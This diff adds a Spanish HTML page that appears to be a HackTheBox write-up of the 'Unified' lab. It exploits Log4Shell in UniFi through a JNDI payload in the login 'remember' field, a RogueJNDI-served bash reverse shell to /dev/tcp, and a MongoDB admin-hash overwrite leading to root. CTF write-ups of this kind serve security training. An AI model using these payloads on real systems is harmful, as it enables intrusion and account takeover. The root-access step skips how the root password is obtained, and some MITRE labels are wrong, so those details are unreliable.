@@ -1,0 +1,283 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Unified — HTB Writeup | YRD</title>
+  <style>
+    :root{--bg:#050a05;--card-bg:#0a1a0a;--border:#1a3d1a;--primary:#39d353;--cyan:#64ffda;--text:#e2e8f0;--text-dim:#94a3b8;--text-muted:#8b949e;--red:#ff6b6b;--yellow:#ffd93d;}
+    *{margin:0;padding:0;box-sizing:border-box;}
+    body{background:var(--bg);color:var(--text);font-family:'Segoe UI',system-ui,sans-serif;min-height:100vh;}
+    canvas#matrix{position:fixed;top:0;left:0;width:100%;height:100%;opacity:0.13;pointer-events:none;z-index:0;}
+    nav{position:sticky;top:0;z-index:100;background:rgba(5,10,5,0.95);backdrop-filter:blur(10px);border-bottom:1px solid var(--border);padding:0 2rem;height:60px;display:flex;align-items:center;justify-content:space-between;}
+    .nav-logo{display:flex;align-items:center;gap:10px;text-decoration:none;}.nav-logo svg{width:32px;height:32px;}.nav-logo span{font-size:1.1rem;font-weight:700;color:var(--primary);letter-spacing:2px;}
+    .nav-links{display:flex;gap:2rem;}.nav-links a{color:var(--text-dim);text-decoration:none;font-size:0.9rem;}.nav-links a:hover{color:var(--primary);}
+    .back-bar{position:relative;z-index:10;background:var(--card-bg);border-bottom:1px solid var(--border);padding:0.75rem 2rem;display:flex;align-items:center;gap:1rem;}
+    .back-btn{color:var(--primary);text-decoration:none;font-size:0.85rem;}.breadcrumb{color:var(--text-muted);font-size:0.85rem;}.breadcrumb span{color:var(--text-dim);}
+    .hero{position:relative;z-index:10;padding:3rem 2rem 2rem;max-width:1200px;margin:0 auto;}
+    .hero-breadcrumb{font-size:0.8rem;color:var(--text-muted);margin-bottom:1rem;}.hero-breadcrumb a{color:var(--primary);text-decoration:none;}
+    .tags{display:flex;flex-wrap:wrap;gap:0.5rem;margin-bottom:1.5rem;}
+    .tag{padding:4px 12px;border-radius:20px;font-size:0.75rem;font-weight:600;letter-spacing:1px;text-transform:uppercase;}
+    .tag-htb{background:rgba(57,211,83,0.15);color:var(--primary);border:1px solid rgba(57,211,83,0.3);}
+    .tag-os{background:rgba(100,255,218,0.1);color:var(--cyan);border:1px solid rgba(100,255,218,0.25);}
+    .tag-easy{background:rgba(57,211,83,0.1);color:#4ade80;border:1px solid rgba(74,222,128,0.3);}
+    .tag-cve{background:rgba(255,107,107,0.1);color:var(--red);border:1px solid rgba(255,107,107,0.3);}
+    .hero h1{font-size:2.8rem;font-weight:800;line-height:1.2;margin-bottom:1rem;}.hero h1 span{color:var(--primary);}
+    .hero-desc{font-size:1.05rem;color:var(--text-dim);line-height:1.7;max-width:700px;margin-bottom:1.5rem;}
+    .meta-row{display:flex;flex-wrap:wrap;gap:2rem;}.meta-item{display:flex;flex-direction:column;gap:4px;}
+    .meta-label{font-size:0.75rem;color:var(--text-muted);text-transform:uppercase;letter-spacing:1px;}
+    .meta-value{font-size:0.9rem;color:var(--text);font-weight:600;}.meta-value.green{color:var(--primary);}
+    .main{position:relative;z-index:10;max-width:1200px;margin:0 auto;padding:2rem;display:grid;grid-template-columns:1fr 300px;gap:2rem;}
+    @media(max-width:900px){.main{grid-template-columns:1fr;}}
+    .content{display:flex;flex-direction:column;gap:2rem;}
+    .section{background:var(--card-bg);border:1px solid var(--border);border-radius:12px;padding:1.75rem;}
+    .section-header{display:flex;align-items:center;gap:10px;margin-bottom:1.25rem;padding-bottom:0.75rem;border-bottom:1px solid var(--border);}
+    .section-icon{width:8px;height:8px;background:var(--primary);border-radius:50%;box-shadow:0 0 8px var(--primary);}
+    .section h2{font-size:1.1rem;font-weight:700;color:var(--primary);text-transform:uppercase;letter-spacing:2px;}
+    .section p{color:var(--text-dim);line-height:1.8;margin-bottom:0.75rem;}
+    .cve-banner{background:rgba(255,107,107,0.08);border:1px solid rgba(255,107,107,0.25);border-radius:10px;padding:1rem 1.25rem;margin-bottom:1rem;}
+    .cve-banner .cve-id{color:var(--red);font-weight:700;font-family:monospace;font-size:1rem;}
+    .cve-banner .cve-desc{color:var(--text-dim);font-size:0.85rem;margin-top:4px;}
+    pre{background:#020c02;border:1px solid var(--border);border-radius:8px;padding:1.25rem;overflow-x:auto;margin:1rem 0;font-size:0.82rem;line-height:1.6;}
+    code{font-family:'Cascadia Code','Fira Code','Courier New',monospace;}
+    .comment{color:#6a9955;}.cmd{color:var(--cyan);}.output{color:var(--text-dim);}.highlight{color:var(--primary);font-weight:600;}.cred{color:var(--yellow);font-weight:600;}.flag-val{color:#ff79c6;}
+    .flags-grid{display:grid;grid-template-columns:1fr 1fr;gap:1rem;margin-top:1rem;}
+    .flag-card{background:#020c02;border:1px solid var(--border);border-radius:10px;padding:1.25rem;}
+    .flag-card .flag-label{font-size:0.75rem;color:var(--text-muted);text-transform:uppercase;letter-spacing:1px;margin-bottom:0.5rem;}
+    .flag-card .flag-hash{font-family:monospace;font-size:0.8rem;color:#ff79c6;word-break:break-all;}
+    .timeline{display:flex;flex-direction:column;gap:0;}
+    .timeline-item{display:flex;gap:1.25rem;}
+    .timeline-left{display:flex;flex-direction:column;align-items:center;}
+    .timeline-dot{width:12px;height:12px;background:var(--primary);border-radius:50%;box-shadow:0 0 10px var(--primary);flex-shrink:0;margin-top:4px;}
+    .timeline-line{width:2px;background:var(--border);flex:1;min-height:30px;}
+    .timeline-item:last-child .timeline-line{display:none;}
+    .timeline-content{padding-bottom:1.5rem;}
+    .timeline-step{font-size:0.7rem;color:var(--primary);text-transform:uppercase;letter-spacing:1px;font-weight:700;}
+    .timeline-title{font-size:0.95rem;color:var(--text);font-weight:600;margin:2px 0;}
+    .timeline-desc{font-size:0.82rem;color:var(--text-dim);line-height:1.6;}
+    .mitre-grid{display:flex;flex-wrap:wrap;gap:0.5rem;margin-top:1rem;}
+    .mitre-tag{background:rgba(57,211,83,0.08);border:1px solid rgba(57,211,83,0.2);color:var(--text-dim);padding:5px 12px;border-radius:6px;font-size:0.78rem;font-family:monospace;}
+    .sidebar{display:flex;flex-direction:column;gap:1.5rem;}
+    .sidebar-card{background:var(--card-bg);border:1px solid var(--border);border-radius:12px;padding:1.5rem;}
+    .sidebar-card h3{font-size:0.8rem;text-transform:uppercase;letter-spacing:2px;color:var(--primary);margin-bottom:1.25rem;padding-bottom:0.5rem;border-bottom:1px solid var(--border);}
+    .detail-row{display:flex;justify-content:space-between;align-items:center;padding:0.5rem 0;border-bottom:1px solid rgba(26,61,26,0.5);}
+    .detail-row:last-child{border-bottom:none;}
+    .detail-key{font-size:0.8rem;color:var(--text-muted);}
+    .detail-val{font-size:0.82rem;color:var(--text);font-weight:600;text-align:right;}
+    .detail-val.green{color:var(--primary);}.detail-val.cyan{color:var(--cyan);}.detail-val.red{color:var(--red);}
+    .skill-item{margin-bottom:1rem;}.skill-item:last-child{margin-bottom:0;}
+    .skill-header{display:flex;justify-content:space-between;margin-bottom:5px;}
+    .skill-name{font-size:0.82rem;color:var(--text-dim);}.skill-pct{font-size:0.8rem;color:var(--primary);font-weight:600;}
+    .skill-bar{height:4px;background:var(--border);border-radius:2px;}
+    .skill-fill{height:100%;background:linear-gradient(90deg,var(--primary),var(--cyan));border-radius:2px;}
+    .tools-list{display:flex;flex-direction:column;gap:0.6rem;}
+    .tool-item{display:flex;align-items:center;gap:10px;padding:0.6rem 0.75rem;background:#020c02;border:1px solid var(--border);border-radius:8px;}
+    .tool-dot{width:6px;height:6px;background:var(--primary);border-radius:50%;}
+    .tool-name{font-size:0.82rem;color:var(--text-dim);font-family:monospace;}
+    .ip-badge{display:inline-block;background:rgba(57,211,83,0.1);border:1px solid rgba(57,211,83,0.3);color:var(--primary);padding:3px 10px;border-radius:6px;font-family:monospace;font-size:0.8rem;}
+  </style>
+</head>
+<body>
+<canvas id="matrix"></canvas>
+
+<nav>
+  <a class="nav-logo" href="#">
+    <svg viewBox="0 0 32 32" fill="none"><polygon points="16,2 30,10 30,22 16,30 2,22 2,10" fill="none" stroke="#39d353" stroke-width="2"/><text x="16" y="21" text-anchor="middle" fill="#39d353" font-size="11" font-weight="bold" font-family="monospace">YRD</text></svg>
+    <span>YRD</span>
+  </a>
+  <div class="nav-links"><a href="#">Home</a><a href="#">About</a><a href="#">Skills</a><a href="#">Projects</a></div>
+</nav>
+
+<div class="back-bar">
+  <a class="back-btn" href="#">← Back</a>
+  <span class="breadcrumb">Machine — <span>Unified (HTB)</span></span>
+</div>
+
+<div class="hero">
+  <div class="hero-breadcrumb"><a href="#">HTB Máquinas</a> / <a href="#">Linux</a> / Unified</div>
+  <div class="tags">
+    <span class="tag tag-htb">HACKTHEBOX</span>
+    <span class="tag tag-os">LINUX</span>
+    <span class="tag tag-easy">EASY</span>
+    <span class="tag tag-cve">CVE-2021-44228</span>
+    <span class="tag tag-htb">LOG4SHELL</span>
+  </div>
+  <h1>Unified <span>Machine</span></h1>
+  <p class="hero-desc">Explotación de la vulnerabilidad crítica <strong>Log4Shell (CVE-2021-44228)</strong> en UniFi Network Application 6.4.54 a través de inyección JNDI en el campo <code>remember</code> del login. Uso de RogueJNDI para obtener shell inversa y modificación directa de contraseñas en MongoDB para comprometer la cuenta root.</p>
+  <div class="meta-row">
+    <div class="meta-item"><span class="meta-label">Autor</span><span class="meta-value green">Yoandy Ramirez Delgado</span></div>
+    <div class="meta-item"><span class="meta-label">CVE Principal</span><span class="meta-value" style="color:#ff6b6b">CVE-2021-44228</span></div>
+    <div class="meta-item"><span class="meta-label">Herramienta Clave</span><span class="meta-value">RogueJNDI / mongo</span></div>
+    <div class="meta-item"><span class="meta-label">Objetivo</span><span class="meta-value">root</span></div>
+  </div>
+</div>
+
+<div class="main">
+  <div class="content">
+
+    <div class="section">
+      <div class="section-header"><div class="section-icon"></div><h2>Escenario</h2></div>
+      <div class="cve-banner">
+        <div class="cve-id">CVE-2021-44228 — Log4Shell</div>
+        <div class="cve-desc">Vulnerabilidad crítica en Apache Log4j 2.x que permite ejecución remota de código mediante inyección JNDI a través de cadenas de log controladas por el usuario. CVSS 10.0.</div>
+      </div>
+      <p>Unified es una máquina Linux del Starting Point de HackTheBox con IP <span class="ip-badge">10.129.96.49</span>. Ejecuta UniFi Network Application versión 6.4.54, que utiliza Log4j vulnerable. El campo <code>remember</code> en la petición de autenticación no sanitiza las expresiones JNDI, permitiendo carga de clases Java remotas.</p>
+    </div>
+
+    <div class="section">
+      <div class="section-header"><div class="section-icon"></div><h2>Reconocimiento</h2></div>
+      <pre><code><span class="cmd">nmap -sC -sV 10.129.96.49</span>
+<span class="output">PORT     STATE SERVICE         VERSION
+22/tcp   open  ssh             OpenSSH 8.2p1
+6789/tcp open  ibm-db2-admin?
+8080/tcp open  http-proxy
+8443/tcp open  https-alt
+8843/tcp open  unknown
+8880/tcp open  cddbp-alt</span>
+
+<span class="comment"># Versión de UniFi detectada en el footer del portal</span>
+<span class="highlight">UniFi Network 6.4.54</span></code></pre>
+    </div>
+
+    <div class="section">
+      <div class="section-header"><div class="section-icon"></div><h2>Explotación — Log4Shell JNDI Injection</h2></div>
+      <p><strong>Interceptar la petición de login con Burp Suite y modificar el campo <code>remember</code>:</strong></p>
+      <pre><code><span class="comment"># Payload Log4Shell en el campo remember</span>
+<span class="cmd">POST /api/login HTTP/1.1
+Host: 10.129.96.49:8443
+Content-Type: application/json
+
+{
+  "username": "a",
+  "password": "a",
+  "remember": "<span class="cred">${jndi:ldap://10.10.14.X:1389/o=tomcat}</span>",
+  "strict": true
+}</span></code></pre>
+
+      <p><strong>Configurar y lanzar RogueJNDI para servir payload Java malicioso:</strong></p>
+      <pre><code><span class="comment"># Compilar y ejecutar RogueJNDI</span>
+<span class="cmd">git clone https://github.com/veracode-research/rogue-jndi
+cd rogue-jndi && mvn package -q</span>
+
+<span class="comment"># Payload: reverse shell en base64</span>
+<span class="cmd">echo 'bash -c bash$IFS-i>&/dev/tcp/10.10.14.X/4444<&1' | base64</span>
+<span class="output">YmFzaCAtYyBiYXNoJElGUy1pPiYvZGV2L3RjcC8xMC4xMC4xNC5YLzQ0NDQ8JjEK</span>
+
+<span class="cmd">java -jar target/RogueJndi-1.1.jar \
+  --command "bash -c {echo,&lt;BASE64&gt;}|{base64,-d}|bash" \
+  --hostname "10.10.14.X"</span>
+
+<span class="cmd">nc -lvnp 4444</span>
+<span class="highlight">unifi@unified:/usr/lib/unifi$ id</span>
+<span class="output">uid=999(unifi) gid=999(unifi)</span>
+
+<span class="cmd">cat /home/michael/user.txt</span>
+<span class="flag-val">6ced1a6a89e666c0620cdb10262ba127</span></code></pre>
+    </div>
+
+    <div class="section">
+      <div class="section-header"><div class="section-icon"></div><h2>Escalada — MongoDB Password Reset</h2></div>
+      <p><strong>MongoDB corre localmente sin autenticación — modificar contraseña del administrador:</strong></p>
+      <pre><code><span class="cmd">mongo --port 27117</span>
+<span class="output">> use ace
+switched to db ace</span>
+
+<span class="comment"># Ver usuarios admin de UniFi</span>
+<span class="cmd">db.admin.find().forEach(printjson)</span>
+<span class="output">{
+  "_id": ObjectId("..."),
+  "name": "administrator",
+  "x_shadow": "<span class="cred">$6$Ry6Vdbse$8enMR5Znxoo.WfCMd/...longshahash...</span>"
+}</span>
+
+<span class="comment"># Generar nuevo hash SHA-512 para contraseña nueva</span>
+<span class="cmd">mkpasswd -m sha-512 Password1234</span>
+<span class="output"><span class="cred">$6$pJlFNFYH$newHashHere...</span></span>
+
+<span class="comment"># Actualizar contraseña del admin en MongoDB</span>
+<span class="cmd">db.admin.update({"name":"administrator"},{$set:{"x_shadow":"$6$pJlFNFYH$newHashHere..."}})</span>
+
+<span class="comment"># Login SSH como root con credenciales del admin</span>
+<span class="cmd">ssh root@10.129.96.49</span>
+<span class="highlight">root@unified:~# id</span>
+<span class="cred">uid=0(root)</span>
+
+<span class="cmd">cat /root/root.txt</span>
+<span class="flag-val">e50bc93c75b634e4b272d2f771c33681</span></code></pre>
+    </div>
+
+    <div class="section">
+      <div class="section-header"><div class="section-icon"></div><h2>Flags</h2></div>
+      <div class="flags-grid">
+        <div class="flag-card"><div class="flag-label">🏴 User Flag</div><div class="flag-hash">6ced1a6a89e666c0620cdb10262ba127</div></div>
+        <div class="flag-card"><div class="flag-label">🏴 Root Flag</div><div class="flag-hash">e50bc93c75b634e4b272d2f771c33681</div></div>
+      </div>
+    </div>
+
+    <div class="section">
+      <div class="section-header"><div class="section-icon"></div><h2>Cadena de Ataque</h2></div>
+      <div class="timeline">
+        <div class="timeline-item"><div class="timeline-left"><div class="timeline-dot"></div><div class="timeline-line"></div></div><div class="timeline-content"><div class="timeline-step">Paso 1</div><div class="timeline-title">Identificación de UniFi 6.4.54</div><div class="timeline-desc">Nmap y análisis del portal web revelan versión de UniFi 6.4.54, vulnerable a Log4Shell (CVE-2021-44228).</div></div></div>
+        <div class="timeline-item"><div class="timeline-left"><div class="timeline-dot"></div><div class="timeline-line"></div></div><div class="timeline-content"><div class="timeline-step">Paso 2</div><div class="timeline-title">JNDI Injection en campo remember</div><div class="timeline-desc">El campo <code>remember</code> en la API de login refleja el valor en logs de Log4j, disparando la inyección JNDI con payload <code>${jndi:ldap://attacker/}</code>.</div></div></div>
+        <div class="timeline-item"><div class="timeline-left"><div class="timeline-dot"></div><div class="timeline-line"></div></div><div class="timeline-content"><div class="timeline-step">Paso 3</div><div class="timeline-title">RogueJNDI → Reverse Shell</div><div class="timeline-desc">Servidor JNDI malicioso sirve payload Java que ejecuta reverse shell. Acceso como usuario <code>unifi</code>.</div></div></div>
+        <div class="timeline-item"><div class="timeline-left"><div class="timeline-dot"></div><div class="timeline-line"></div></div><div class="timeline-content"><div class="timeline-step">Paso 4</div><div class="timeline-title">MongoDB sin Auth → Admin Reset</div><div class="timeline-desc">MongoDB corre sin autenticación en puerto 27117. Se modifica el hash SHA-512 del administrador en la DB <code>ace</code>.</div></div></div>
+        <div class="timeline-item"><div class="timeline-left"><div class="timeline-dot"></div><div class="timeline-line"></div></div><div class="timeline-content"><div class="timeline-step">Paso 5</div><div class="timeline-title">SSH como root → Root Flag</div><div class="timeline-desc">Login SSH con las credenciales del administrador de UniFi que son compartidas con root del sistema operativo.</div></div></div>
+      </div>
+    </div>
+
+    <div class="section">
+      <div class="section-header"><div class="section-icon"></div><h2>MITRE ATT&amp;CK</h2></div>
+      <div class="mitre-grid">
+        <span class="mitre-tag">T1190 — Exploit Public-Facing App</span>
+        <span class="mitre-tag">T1203 — Log4Shell RCE</span>
+        <span class="mitre-tag">T1059 — Command Execution</span>
+        <span class="mitre-tag">T1505 — Server-Side Components</span>
+        <span class="mitre-tag">T1136 — Account Manipulation (MongoDB)</span>
+        <span class="mitre-tag">T1021.004 — SSH Lateral Movement</span>
+      </div>
+    </div>
+
+  </div>
+
+  <div class="sidebar">
+    <div class="sidebar-card">
+      <h3>Detalles del Reto</h3>
+      <div class="detail-row"><span class="detail-key">Dificultad</span><span class="detail-val green">Easy</span></div>
+      <div class="detail-row"><span class="detail-key">Sistema Operativo</span><span class="detail-val">Linux</span></div>
+      <div class="detail-row"><span class="detail-key">IP Target</span><span class="detail-val cyan">10.129.96.49</span></div>
+      <div class="detail-row"><span class="detail-key">CVE</span><span class="detail-val red">CVE-2021-44228</span></div>
+      <div class="detail-row"><span class="detail-key">Software</span><span class="detail-val">UniFi 6.4.54</span></div>
+      <div class="detail-row"><span class="detail-key">CVSS</span><span class="detail-val red">10.0 CRÍTICO</span></div>
+    </div>
+    <div class="sidebar-card">
+      <h3>Skills Demostradas</h3>
+      <div class="skill-item"><div class="skill-header"><span class="skill-name">Log4Shell Exploitation</span><span class="skill-pct">95%</span></div><div class="skill-bar"><div class="skill-fill" style="width:95%"></div></div></div>
+      <div class="skill-item"><div class="skill-header"><span class="skill-name">JNDI Injection</span><span class="skill-pct">90%</span></div><div class="skill-bar"><div class="skill-fill" style="width:90%"></div></div></div>
+      <div class="skill-item"><div class="skill-header"><span class="skill-name">MongoDB Enumeration</span><span class="skill-pct">85%</span></div><div class="skill-bar"><div class="skill-fill" style="width:85%"></div></div></div>
+      <div class="skill-item"><div class="skill-header"><span class="skill-name">CVE Research & PoC</span><span class="skill-pct">92%</span></div><div class="skill-bar"><div class="skill-fill" style="width:92%"></div></div></div>
+    </div>
+    <div class="sidebar-card">
+      <h3>Herramientas</h3>
+      <div class="tools-list">
+        <div class="tool-item"><div class="tool-dot"></div><span class="tool-name">nmap</span></div>
+        <div class="tool-item"><div class="tool-dot"></div><span class="tool-name">Burp Suite</span></div>
+        <div class="tool-item"><div class="tool-dot"></div><span class="tool-name">RogueJNDI</span></div>
+        <div class="tool-item"><div class="tool-dot"></div><span class="tool-name">mongo CLI</span></div>
+        <div class="tool-item"><div class="tool-dot"></div><span class="tool-name">mkpasswd</span></div>
+        <div class="tool-item"><div class="tool-dot"></div><span class="tool-name">nc (netcat)</span></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+<script>
+  const canvas=document.getElementById('matrix');const ctx=canvas.getContext('2d');
+  canvas.width=window.innerWidth;canvas.height=window.innerHeight;
+  window.addEventListener('resize',()=>{canvas.width=window.innerWidth;canvas.height=window.innerHeight;});
+  const chars='アイウエオ0123456789ABCDEF<>{}[]';const fontSize=14;
+  let cols=Math.floor(canvas.width/fontSize);let drops=Array(cols).fill(1);
+  function drawMatrix(){ctx.fillStyle='rgba(5,10,5,0.05)';ctx.fillRect(0,0,canvas.width,canvas.height);ctx.fillStyle='#39d353';ctx.font=fontSize+'px monospace';for(let i=0;i<drops.length;i++){const char=chars[Math.floor(Math.random()*chars.length)];ctx.fillText(char,i*fontSize,drops[i]*fontSize);if(drops[i]*fontSize>canvas.height&&Math.random()>0.975)drops[i]=0;drops[i]++;}}
+  setInterval(drawMatrix,35);
+</script>
+</body>
+</html>
